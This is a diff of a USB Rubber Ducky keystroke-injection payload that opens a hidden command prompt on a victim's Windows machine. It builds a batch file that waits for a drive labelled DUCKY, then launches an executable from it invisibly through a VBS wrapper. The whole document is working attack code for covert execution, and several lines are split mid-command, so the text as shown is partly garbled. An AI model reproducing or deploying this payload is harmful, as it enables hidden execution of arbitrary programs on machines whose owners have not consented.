@@ -4,9 +4,12 @@ The following is a payload I have been working on that waits until a drive label
 REM Author: overwraith
 REM Name: RunEXE.txt
 REM Purpose: Run an executable file off of the SD card after it mounts. 
-DELAY 4000
-REM Using the run command for a broader OS base.
+REM Encoder V2.4
+REM Using the run command for a broader OS base. 
+DEFAULT_DELAY 25
+DELAY 3000
 GUI R
+DELAY 1000
 STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
 DELAY 500
 ENTER
@@ -16,90 +19,57 @@ STRING M
 DOWNARROW
 REPEAT 100
 ENTER
-DELAY 25
+
 REM Make batch file that waits for SD card to mount. 
 REM Delete batch file if already exists
-DELAY 25
 STRING erase /Q DuckyWait.bat
-DELAY 25
 ENTER
-DELAY 25
 STRING copy con DuckyWait.bat
-DELAY 25
 ENTER
-DELAY 25
 REM DuckyWait.bat
-DELAY 25
 STRING :while1
-DELAY 25
 ENTER
-DELAY 25
-STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
-DELAY 25
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') 
+
+do set myd=%%d
 ENTER
-DELAY 25
 STRING if Exist %myd% (
-DELAY 25
 ENTER
-DELAY 25
 STRING goto break
-DELAY 25
 ENTER
-DELAY 25
 STRING )
-DELAY 25
 ENTER
-DELAY 25
 STRING timeout /t 30
-DELAY 25
 ENTER
-DELAY 25
 STRING goto while1
-DELAY 25
 ENTER
-DELAY 25
 STRING :break
-DELAY 25
 ENTER
-DELAY 25
 REM Continue script.
-DELAY 25
-STRING START %myd%\myEXE.bat
-DELAY 25
+STRING START %myd%\HelloWorld.exe
 ENTER
-DELAY 25
 CONTROL z
-DELAY 25
 ENTER
-DELAY 25
+
 REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
-DELAY 25
 REM Delete vbs file if already exists
-DELAY 25
 STRING erase /Q invis.vbs
-DELAY 25
 ENTER
-DELAY 25
-REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
-DELAY 25
+REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-
+
+background-when-windows-boots-up
 STRING copy con invis.vbs
-DELAY 25
 ENTER
-DELAY 25
-STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
-DELAY 25
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, 
+
+False
 ENTER
-DELAY 25
 CONTROL Z
-DELAY 25
 ENTER
-DELAY 25
+
 REM RUN THE BATCH FILE
-DELAY 25
 STRING wscript.exe invis.vbs DuckyWait.bat
-DELAY 25
 ENTER
-DELAY 25
 STRING EXIT
 ENTER
 ```
